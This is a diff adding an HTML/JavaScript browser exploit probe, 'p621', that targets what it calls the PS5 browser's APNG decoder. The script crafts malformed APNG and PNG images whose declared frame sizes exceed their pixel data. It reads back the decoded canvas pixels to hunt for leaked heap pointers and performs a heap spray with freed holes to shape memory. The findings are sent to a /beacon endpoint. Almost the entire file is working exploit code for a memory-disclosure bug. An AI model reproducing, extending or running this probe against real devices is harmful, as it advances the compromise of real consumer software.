@@ -1,0 +1,357 @@
+<!--
+  p621: APNG decoder overread heap pointer leak.
+
+  Constructs malformed APNG images in JS where frame data is shorter
+  than the declared frame dimensions. If the decoder reads past the
+  compressed data, heap residue appears as pixel values.
+
+  Pixel values are uint8 (getImageData), so DAZ does not apply.
+  We look for non-zero pixels in the overread region, especially
+  values that look like heap pointers (0x10008x range on PS5).
+
+  Tests multiple APNG variants:
+  - Truncated fdAT (frame data shorter than frame size)
+  - Missing fdAT (fcTL with no following fdAT)
+  - fcTL width > IHDR width
+  - Second frame larger than first
+
+  CRASH_CLASS: MODERATE (image decoder crash possible)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p621</title></head>
+<body><pre id="out">p621 APNG overread</pre>
+<script>
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(m){
+  say(m);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P621-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}
+}
+
+/* CRC32 for PNG chunks */
+var crcTable=null;
+function makeCrcTable(){
+  crcTable=new Uint32Array(256);
+  for(var n=0;n<256;n++){
+    var c=n;
+    for(var k=0;k<8;k++) c=c&1?0xEDB88320^(c>>>1):c>>>1;
+    crcTable[n]=c;
+  }
+}
+function crc32(buf,off,len){
+  if(!crcTable)makeCrcTable();
+  var c=0xFFFFFFFF;
+  for(var i=off;i<off+len;i++) c=crcTable[(c^buf[i])&0xFF]^(c>>>8);
+  return (c^0xFFFFFFFF)>>>0;
+}
+
+function w32(buf,off,v){
+  buf[off]=(v>>>24)&0xFF;
+  buf[off+1]=(v>>>16)&0xFF;
+  buf[off+2]=(v>>>8)&0xFF;
+  buf[off+3]=v&0xFF;
+}
+
+/* Minimal zlib deflate for raw pixel data (store blocks only) */
+function zlibStore(raw){
+  var out=new Uint8Array(raw.length+11+Math.ceil(raw.length/65535)*5);
+  var p=0;
+  out[p++]=0x78; out[p++]=0x01; /* zlib header */
+  var rem=raw.length;
+  var rp=0;
+  while(rem>0){
+    var bsz=Math.min(rem,65535);
+    var last=rem<=65535?1:0;
+    out[p++]=last;
+    out[p++]=bsz&0xFF; out[p++]=(bsz>>8)&0xFF;
+    out[p++]=(~bsz)&0xFF; out[p++]=((~bsz)>>8)&0xFF;
+    for(var i=0;i<bsz;i++) out[p++]=raw[rp++];
+    rem-=bsz;
+  }
+  /* adler32 */
+  var a=1,b=0;
+  for(var i=0;i<raw.length;i++){a=(a+raw[i])%65521;b=(b+a)%65521;}
+  var adler=(b<<16)|a;
+  w32(out,p,adler); p+=4;
+  return out.subarray(0,p);
+}
+
+function makeChunk(type,data){
+  var tBytes=[type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3)];
+  var chunk=new Uint8Array(4+4+data.length+4);
+  w32(chunk,0,data.length);
+  chunk[4]=tBytes[0];chunk[5]=tBytes[1];chunk[6]=tBytes[2];chunk[7]=tBytes[3];
+  chunk.set(data,8);
+  var c=crc32(chunk,4,4+data.length);
+  w32(chunk,8+data.length,c);
+  return chunk;
+}
+
+function concat(){
+  var total=0;
+  for(var i=0;i<arguments.length;i++) total+=arguments[i].length;
+  var out=new Uint8Array(total);
+  var off=0;
+  for(var i=0;i<arguments.length;i++){out.set(arguments[i],off);off+=arguments[i].length;}
+  return out;
+}
+
+var PNG_SIG=new Uint8Array([137,80,78,71,13,10,26,10]);
+
+/* Build IHDR */
+function makeIHDR(w,h,depth,colorType){
+  var d=new Uint8Array(13);
+  w32(d,0,w); w32(d,4,h);
+  d[8]=depth; d[9]=colorType; d[10]=0; d[11]=0; d[12]=0;
+  return makeChunk('IHDR',d);
+}
+
+/* Build acTL (animation control) */
+function makeAcTL(numFrames,numPlays){
+  var d=new Uint8Array(8);
+  w32(d,0,numFrames); w32(d,4,numPlays);
+  return makeChunk('acTL',d);
+}
+
+/* Build fcTL (frame control) */
+var seqNum=0;
+function makeFcTL(w,h,xoff,yoff,delay_num,delay_den,dispose,blend){
+  var d=new Uint8Array(26);
+  w32(d,0,seqNum++);
+  w32(d,4,w); w32(d,8,h);
+  w32(d,12,xoff); w32(d,16,yoff);
+  d[20]=(delay_num>>8)&0xFF; d[21]=delay_num&0xFF;
+  d[22]=(delay_den>>8)&0xFF; d[23]=delay_den&0xFF;
+  d[24]=dispose; d[25]=blend;
+  return makeChunk('fcTL',d);
+}
+
+/* Build fdAT (frame data) */
+function makeFdAT(compressedData){
+  var d=new Uint8Array(4+compressedData.length);
+  w32(d,0,seqNum++);
+  d.set(compressedData,4);
+  return makeChunk('fdAT',d);
+}
+
+/* Build IDAT (first frame data) */
+function makeIDAT(compressedData){
+  return makeChunk('IDAT',compressedData);
+}
+
+var IEND=makeChunk('IEND',new Uint8Array(0));
+
+/* Generate raw pixel rows (filter byte 0 + RGBA pixels) */
+function makeRawPixels(w,h,r,g,b,a){
+  var rowLen=1+w*4; /* filter byte + w*RGBA */
+  var raw=new Uint8Array(rowLen*h);
+  for(var y=0;y<h;y++){
+    raw[y*rowLen]=0; /* no filter */
+    for(var x=0;x<w;x++){
+      var off=y*rowLen+1+x*4;
+      raw[off]=r; raw[off+1]=g; raw[off+2]=b; raw[off+3]=a;
+    }
+  }
+  return raw;
+}
+
+/* === TEST VARIANTS === */
+
+function buildVariantA(){
+  /* Normal 4x4 APNG, 2 frames. Frame 2 declares 4x4 but fdAT has only 1x1 pixel data */
+  seqNum=0;
+  var ihdr=makeIHDR(4,4,8,6); /* 4x4 RGBA */
+  var actl=makeAcTL(2,0);
+
+  /* Frame 1: full 4x4 red */
+  var raw1=makeRawPixels(4,4,0xFF,0,0,0xFF);
+  var z1=zlibStore(raw1);
+  var fctl1=makeFcTL(4,4,0,0,100,1000,0,0);
+  var idat1=makeIDAT(z1);
+
+  /* Frame 2: fcTL says 4x4, but fdAT has only 1x1 green pixel */
+  var raw2=makeRawPixels(1,1,0,0xFF,0,0xFF);
+  var z2=zlibStore(raw2);
+  var fctl2=makeFcTL(4,4,0,0,100,1000,0,0);
+  var fdat2=makeFdAT(z2);
+
+  return concat(PNG_SIG,ihdr,actl,fctl1,idat1,fctl2,fdat2,IEND);
+}
+
+function buildVariantB(){
+  /* IHDR declares 64x1, frame 1 is 1x1 (tiny IDAT for a "64x1" image) */
+  seqNum=0;
+  var ihdr=makeIHDR(64,1,8,6);
+  var actl=makeAcTL(1,0);
+
+  /* Frame 1: fcTL says 64x1, IDAT has only 1x1 */
+  var raw=makeRawPixels(1,1,0x41,0x42,0x43,0xFF);
+  var z=zlibStore(raw);
+  var fctl=makeFcTL(64,1,0,0,100,1000,0,0);
+  var idat=makeIDAT(z);
+
+  return concat(PNG_SIG,ihdr,actl,fctl,idat,IEND);
+}
+
+function buildVariantC(){
+  /* Normal 1x1 PNG (no animation), used as control */
+  seqNum=0;
+  var ihdr=makeIHDR(1,1,8,6);
+  var raw=makeRawPixels(1,1,0xDE,0xAD,0xBE,0xFF);
+  var z=zlibStore(raw);
+  var idat=makeIDAT(z);
+  return concat(PNG_SIG,ihdr,idat,IEND);
+}
+
+function buildVariantD(){
+  /* Large IHDR (128x1), tiny IDAT (2x1 pixel data). Check what happens past pixel 2 */
+  seqNum=0;
+  var ihdr=makeIHDR(128,1,8,6);
+  var raw=makeRawPixels(2,1,0xCA,0xFE,0xBA,0xFF);
+  var z=zlibStore(raw);
+  var idat=makeIDAT(z);
+  return concat(PNG_SIG,ihdr,idat,IEND);
+}
+
+function buildVariantE(){
+  /* Heap spray first, then load an APNG that might overread into sprayed data */
+  /* This variant builds a normal 8x8 APNG — the spray happens before loading */
+  seqNum=0;
+  var ihdr=makeIHDR(8,8,8,6);
+  var actl=makeAcTL(2,0);
+
+  var raw1=makeRawPixels(8,8,0xFF,0,0,0xFF);
+  var z1=zlibStore(raw1);
+  var fctl1=makeFcTL(8,8,0,0,100,1000,0,0);
+  var idat1=makeIDAT(z1);
+
+  /* Frame 2: 8x8 declared, 1x1 actual */
+  var raw2=makeRawPixels(1,1,0,0,0xFF,0xFF);
+  var z2=zlibStore(raw2);
+  var fctl2=makeFcTL(8,8,0,0,100,1000,0,0);
+  var fdat2=makeFdAT(z2);
+
+  return concat(PNG_SIG,ihdr,actl,fctl1,idat1,fctl2,fdat2,IEND);
+}
+
+/* Load image and draw to canvas, read pixels */
+function testVariant(name, pngBytes, callback){
+  var blob=new Blob([pngBytes],{type:'image/png'});
+  var url=URL.createObjectURL(blob);
+  var img=new Image();
+  img.onload=function(){
+    bk(name+'-LOADED:w='+img.naturalWidth+',h='+img.naturalHeight);
+    var c=document.createElement('canvas');
+    c.width=img.naturalWidth;
+    c.height=img.naturalHeight;
+    var ctx=c.getContext('2d');
+    ctx.drawImage(img,0,0);
+    var id=ctx.getImageData(0,0,c.width,c.height);
+    var d=id.data;
+
+    /* Scan for non-zero pixels past expected data */
+    var nonZero=0;
+    var firstNZ=-1;
+    var ptrCandidates=[];
+    var hexDump='';
+
+    for(var i=0;i<d.length;i+=4){
+      var px=i/4;
+      var r=d[i],g=d[i+1],b=d[i+2],a=d[i+3];
+      if(r!==0||g!==0||b!==0||a!==0){
+        nonZero++;
+        if(firstNZ===-1) firstNZ=px;
+      }
+      /* Collect hex for first 64 pixels */
+      if(px<64){
+        hexDump+=('00'+r.toString(16)).slice(-2)+('00'+g.toString(16)).slice(-2)+
+                 ('00'+b.toString(16)).slice(-2)+('00'+a.toString(16)).slice(-2)+' ';
+      }
+    }
+
+    /* Look for pointer patterns in qword-aligned reads */
+    /* PS5 heap pointers: 0x10008xxxxx range → bytes would be xx xx 00 10 (LE) */
+    for(var i=0;i+7<d.length;i+=4){
+      /* Read 8 bytes as LE qword high bytes */
+      var hi=(d[i+7]<<24)|(d[i+6]<<16)|(d[i+5]<<8)|d[i+4];
+      if((hi>>>16)===0x1000){
+        var lo=(d[i+3]<<24)|(d[i+2]<<16)|(d[i+1]<<8)|d[i];
+        ptrCandidates.push('px'+Math.floor(i/4)+':0x'+
+          ('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8));
+      }
+    }
+
+    bk(name+'-SCAN:total='+d.length/4+'px,nz='+nonZero+',first='+firstNZ);
+    if(hexDump.length>0) bk(name+'-HEX:'+hexDump.substring(0,400));
+    if(ptrCandidates.length>0) bk(name+'-PTRS:'+ptrCandidates.join(',').substring(0,400));
+    else bk(name+'-NO-PTRS');
+
+    URL.revokeObjectURL(url);
+    callback();
+  };
+  img.onerror=function(){
+    bk(name+'-ERR:load-failed');
+    URL.revokeObjectURL(url);
+    callback();
+  };
+  img.src=url;
+}
+
+function main(){
+  bk('BOOT:ua='+navigator.userAgent.substring(0,60));
+
+  var variants=[
+    {name:'VA',build:buildVariantA,desc:'4x4 APNG, frame2 truncated fdAT'},
+    {name:'VB',build:buildVariantB,desc:'64x1 IHDR, 1x1 IDAT'},
+    {name:'VC',build:buildVariantC,desc:'1x1 control PNG'},
+    {name:'VD',build:buildVariantD,desc:'128x1 IHDR, 2x1 IDAT'},
+    {name:'VE',build:buildVariantE,desc:'8x8 APNG, frame2 1x1 after heap spray'}
+  ];
+
+  var idx=0;
+  function runNext(){
+    if(idx>=variants.length){
+      bk('DONE:all-'+variants.length+'-tested');
+
+      /* Bonus: try heap spray then APNG */
+      bk('SPRAY-TEST:starting');
+      var spray=[];
+      for(var i=0;i<2000;i++){
+        var ab=new ArrayBuffer(256);
+        var v=new Uint8Array(ab);
+        /* Fill with pointer-like pattern */
+        for(var j=0;j<256;j+=8){
+          v[j]=0x78; v[j+1]=0x56; v[j+2]=0x34; v[j+3]=0x12;
+          v[j+4]=0x00; v[j+5]=0x8C; v[j+6]=0x00; v[j+7]=0x10;
+        }
+        spray.push(ab);
+      }
+      /* Free half to create holes */
+      for(var i=0;i<1000;i++) spray[i]=null;
+      bk('SPRAY-FREED:1000-of-2000');
+
+      /* Now load APNG variant A — decoder might allocate into freed holes */
+      var pngE=buildVariantA();
+      seqNum=0;
+      testVariant('SPRAY',pngE,function(){
+        bk('ALL-COMPLETE');
+      });
+      return;
+    }
+    var v=variants[idx];
+    bk('TEST:'+v.name+'='+v.desc);
+    var png=v.build();
+    bk('PNG-SIZE:'+png.length);
+    testVariant(v.name,png,function(){
+      idx++;
+      setTimeout(runNext,100);
+    });
+  }
+
+  runNext();
+}
+
+setTimeout(main,100);
+</script>
+</body></html>
